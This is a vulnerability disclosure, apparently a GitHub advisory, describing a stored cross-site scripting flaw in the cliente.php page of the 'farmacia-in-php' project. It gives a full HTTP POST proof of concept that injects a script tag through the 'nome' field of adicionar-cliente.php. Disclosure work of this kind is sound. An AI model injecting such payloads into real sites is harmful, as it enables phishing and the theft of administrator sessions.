# farmacia-in-php has Based Cross Site Scripting vulnerability via $nome parameter in cliente.php.

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
cliente.php and $nome parameter
## describe
There is an  Cross Site Scripting vulnerability in farmacia-in-php in cliente.php,  Control parameter: **$value['nome']**

Malicious attackers can use this cross-site scripting vulnerability to conduct phishing attacks and obtain administrator login information and permissions.

## code analysis

echo $value['nome'] without filtering，And $value['nome'] is obtained from the database.This causes a stored cross-site scripting vulnerability

```
   <td><?php echo $value['nome']?></td>
```

![image-20241113112138909](https://github.com/user-attachments/assets/cfea0496-1d9e-4317-b878-1fd9b55e64a9)

![image-20241113112157718](https://github.com/user-attachments/assets/e43a232d-b90b-4a88-b492-c90210f4470f)

## POC

Inset the Scripting  into databases.

```
POST /adicionar-cliente.php HTTP/1.1
Host: farmacia
Content-Length: 1030
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://farmacia
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIpXK3FdEXDxx83Jb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://farmacia/adicionar-cliente.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryIpXK3FdEXDxx83Jb
Content-Disposition: form-data; name="nome"

<script>alert(123);</script>
------WebKitFormBoundaryIpXK3FdEXDxx83Jb
Content-Disposition: form-data; name="cpf"

1
------WebKitFormBoundaryIpXK3FdEXDxx83Jb
Content-Disposition: form-data; name="dataNascimento"

2024-11-16
------WebKitFormBoundaryIpXK3FdEXDxx83Jb
Content-Disposition: form-data; name="endereco"

1
------WebKitFormBoundaryIpXK3FdEXDxx83Jb
Content-Disposition: form-data; name="numero"

1
------WebKitFormBoundaryIpXK3FdEXDxx83Jb
Content-Disposition: form-data; name="bairro"

1
------WebKitFormBoundaryIpXK3FdEXDxx83Jb
Content-Disposition: form-data; name="telefone"

1
------WebKitFormBoundaryIpXK3FdEXDxx83Jb
Content-Disposition: form-data; name="celular"

1
------WebKitFormBoundaryIpXK3FdEXDxx83Jb
Content-Disposition: form-data; name="email"

1@o.com
------WebKitFormBoundaryIpXK3FdEXDxx83Jb
Content-Disposition: form-data; name="acao"


------WebKitFormBoundaryIpXK3FdEXDxx83Jb--
```

**Result**

Visit this URL to trigger the cross-site scripting vulnerability.

```
http://farmacia/cliente.php
```

![image-20241113112722044](https://github.com/user-attachments/assets/cf1c8340-f6e0-4310-9eb7-c9e99e469ad9)